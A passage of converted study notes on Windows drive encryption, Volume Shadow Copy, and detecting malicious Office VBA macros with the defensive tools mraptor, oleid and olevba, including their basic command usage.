    * Drive encryption that integrates with operating system and addresses the threats of data theft or exposure from lost, stolen, or inappropriately decommissioned computer
* Volume shadow copy service (VSS)
    * Coordinates the required actions to create a consistent shadow copy (snapshot) of the data that is to be backed up
    * If enabled, can perform
        * Create a restore point
        * Perform system restore
        * Configure restore settings
        * Delete restore points


# File Macro Fundamentals



* A - Auto execution trigger
* W - Write to the file system or memory
* X - execute a file or any payload outside the VBA Context
* Mraptor
    * **<span style="text-decoration:underline;">Designed to detect most malicious VBA Macros</span>**
    * Considers macro to be suspicious when A and (W or X) are true
    * <span style="text-decoration:underline;">Example: mraptor -r &lt;file/filepath> or * for all file</span>
    * 

<p id="gdcalert21" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image21.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert22">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image21.png "image_tooltip")

* Oleid
    * Tool to analyze OLE files to detect specific characteristics usually found in malicious files
    * <span style="text-decoration:underline;">Example: oleid &lt;file></span>
* Olevba
    * Script used to parse OLE and openXML files, such as MS Office documents, to detect VBA macros and to extract their source code in cleartext
    * Shows dump file with commands and when they’re executed
    * <span style="text-decoration:underline;">Example: olevba -d &lt;file></span>
    * 

<p id="gdcalert22" ><span style="color: red; font-weight: bold">>>>>>  gd2md-html alert: inline image link here (to images/image22.png). Store image on your image server and adjust path/filename/extension if necessary. </span><br>(<a href="#">Back to top</a>)(<a href="#gdcalert23">Next alert</a>)<br><span style="color: red; font-weight: bold">>>>>> </span></p>


![alt_text](images/image22.png "image_tooltip")
